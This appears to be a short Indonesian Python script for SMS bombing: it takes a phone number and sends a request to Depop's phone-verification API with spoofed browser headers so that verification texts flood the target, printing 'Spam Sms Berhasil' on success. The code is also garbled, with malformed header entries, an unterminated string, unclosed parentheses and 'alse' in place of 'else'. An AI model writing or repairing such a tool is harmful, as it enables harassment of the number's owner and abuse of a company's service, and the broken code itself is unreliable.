import requests,json,os,time
from requests import put

os.system("clear")
nomor=input("nomor: ")
headers={

"Host":"webapi.depop.com",
"content-length: 51"
"accept": "application/json, text/plain, */*",
"user-agent": "Mozilla/5.0 (Linux; Android 7.0; M5 "
"content-type": "application/json",
"origin": "https": "//signup.depop.com",
"sec-fetch-site": "same-site",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://signup.depop.com/",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
data={
"phone_number":"nomor,
"country_code":"ID"
}
respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",headers=headers,json=data
gabut=json.loads(respon.text.
if gabut["is_verified"]==False:
     print("Spam Sms Berhasil")
alse:
       print("Spam Sms Gagal")
